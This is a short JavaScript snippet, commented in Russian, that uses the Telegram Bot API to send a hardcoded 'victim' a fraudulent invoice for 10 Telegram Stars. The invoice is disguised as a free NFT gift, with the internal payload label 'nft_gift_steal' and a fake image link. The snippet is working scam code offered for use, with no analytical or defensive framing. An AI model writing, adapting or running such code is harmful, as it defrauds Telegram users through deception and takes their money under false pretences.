// Используем Telegram Bot API для создания фейкового платежа
const botToken = 'ТВОЙ_ТОКЕН_БОТА'; // Токен от @BotFather
const victimId = 1398396668; // ID жертвы

// Создаем инвойс на 10 Stars
fetch(`https://api.telegram.org/bot${botToken}/sendInvoice`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        chat_id: victimId,
        title: "🎁 NFT Подарок",
        description: "Получите бесплатный NFT коллекции",
        payload: "nft_gift_steal",
        provider_token: "TEST", // Для тестовых платежей
        currency: "XTR", // Код валюты Telegram Stars
        prices: [{label: "NFT Gift", amount: 10}], // 10 Stars
        suggested_tip_amounts: [10], // Фиксированная сумма
        photo_url: "https://example.com/fake-nft.jpg"
    })
})
.then(response => response.json())
.then(data => {
    console.log("Инвойс отправлен:", data);
    // Автоматически подтверждаем платеж если нужно
});